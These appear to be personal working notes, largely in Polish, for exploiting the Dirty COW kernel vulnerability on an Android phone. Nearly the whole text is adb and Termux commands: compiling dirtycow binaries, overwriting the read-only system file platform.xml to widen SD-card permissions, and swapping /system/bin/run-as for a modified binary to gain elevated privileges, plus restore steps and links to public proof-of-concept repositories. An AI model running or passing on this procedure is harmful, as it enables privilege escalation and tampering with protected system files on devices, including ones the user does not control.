adb shell

wersja jądra:
cat /proc/version

execute file:
adb push executable /data/local/tmp
adb shell
cd /data/local/tmp
chmod 755 executable
./executable

dirtycow, kopie:
/data/local/tmp/dirtycowy/
/sdcard/dirtycow

Android PoC: https://github.com/timwr/CVE-2016-5195



file:
/system/etc/permissions/platform.xml

-rw-r--r-- root     root         6470 2015-08-04 13:14 platform.xml

pobranie backupa:
adb pull /system/etc/permissions/platform.xml platform.xml.backup

W miejscu:
<permission name="android.permission.WRITE_EXTERNAL_STORAGE" >
	<group gid=”sdcard_r” />
	<group gid=”sdcard_rw” />
</permission>

Dopisać:
<permission name="android.permission.WRITE_EXTERNAL_STORAGE" >
	<group gid=”sdcard_r” />
	<group gid=”sdcard_rw” />
	<group gid=”media_rw” />
</permission>

kompilacja dirtycow.c

położenie dirtycow:
/storage/emulated/legacy/dirtycow/dirtycow
/data/local/tmp/dirtycowy/dirtycowy

folder, w którym można wykonywać przez adb
/data/local/tmp/

TEST na plikach z /storage/extSdCard/tmp/sdrw
/data/local/tmp/dirtycowy/dirtycowy /storage/extSdCard/tmp/sdrw/platform.xml.test /storage/extSdCard/tmp/sdrw/platform.xml.fixed2
wynik testu:
/data/local/tmp/dirtycowy/dirtycowy --cmp /storage/extSdCard/tmp/sdrw/platform.xml.test /storage/extSdCard/tmp/sdrw/platform.xml.fixed2

po dopisaniu wiersza, wycięcie znaków, aby liczba się zgadzała, plik:
platform.xml.fixed2

EXECUTE DIRTY COWY ANDROID WRITE SD PERMISSION HACK:
/data/local/tmp/dirtycowy/dirtycowy /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed3
WYNIK:
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed3

nowy /system/etc/permissions/platform.xml:
-rw-r--r-- root     root         6470 2015-08-04 13:14 platform.xml

=== INSTRUKCJA ===
1. Umieścić zmodyfikowane pliki platform.xml na karcie pamięci /storage/extSdCard/tmp/sdrw
2. Umieścić pliki *.c na karcie pamięci: /storage/extSdCard/tmp/sdrw
3. Skopiowanie do katalogu termuxa, kompilacja, skopiowanie do współdzielonego folderu (TERMUX)
cp /storage/extSdCard/tmp/sdrw/*.c .
gcc -pthread dirtycowy.c -o dirtycowy
gcc run-as.c -o run-as
cp * /storage/extSdCard/Android/data/com.termux/files/dirtycowy/
4. skopiowanie do wykonywalnego folderu /data/local/tmp (ADB), nadanie uprawnień wykonywania
cp /storage/extSdCard/Android/data/com.termux/files/dirtycowy/* /data/local/tmp/dirtycowy/
chmod -R 777 /data/local/tmp/dirtycowy/
cp /data/local/tmp/dirtycowy/run-as /storage/extSdCard/tmp/sdrw/run-as.fixed
5. Wykonać Test, sprawdzić wynik, np na karcie pamięci:
cp /storage/extSdCard/tmp/sdrw/platform.xml.backup /storage/extSdCard/tmp/sdrw/platform.xml.test
/data/local/tmp/dirtycowy/dirtycowy
/data/local/tmp/dirtycowy/dirtycowy --cmp /storage/extSdCard/tmp/sdrw/platform.xml.test /storage/extSdCard/tmp/sdrw/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy /storage/extSdCard/tmp/sdrw/platform.xml.test /storage/extSdCard/tmp/sdrw/platform.xml.fixed2 --check-done
/data/local/tmp/dirtycowy/dirtycowy --cmp /storage/extSdCard/tmp/sdrw/platform.xml.test /storage/extSdCard/tmp/sdrw/platform.xml.fixed2
6. Stworzyć backup /system/etc/permissions/platform.xml
7. WYKONAĆ DIRTY COWY SD RW HACK
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed2 --check-done
8. Sprawdzić wynik
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/etc/permissions/platform.xml /storage/extSdCard/tmp/sdrw/platform.xml.fixed2


adb shell '/data/local/tmp/dirtycowy /system/bin/run-as /data/local/tmp/run-as'
adb shell /system/bin/run-as

Zmiana run-as:
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/bin/run-as /storage/extSdCard/tmp/sdrw/run-as.fixed
/data/local/tmp/dirtycowy/dirtycowy /system/bin/run-as /storage/extSdCard/tmp/sdrw/run-as.fixed --check-done
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/bin/run-as /storage/extSdCard/tmp/sdrw/run-as.fixed

/system/bin/run-as

Test Użytkownika:
id

Przywrócenie:
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/bin/run-as /storage/extSdCard/tmp/sdrw/run-as.backup
/data/local/tmp/dirtycowy/dirtycowy /system/bin/run-as /storage/extSdCard/tmp/sdrw/run-as.backup --check-done
/data/local/tmp/dirtycowy/dirtycowy --cmp /system/bin/run-as /storage/extSdCard/tmp/sdrw/run-as.backup



something on this device keeps rebooting and restoring the system partition if any file is changed. 
SELinux or dm-verity reset, revert, restore system partition

gwarancja: KNOX counter - non-void if 0

hasło 0xdeadbeef
deadbeef:
https://github.com/scumjr/dirtycow-vdso
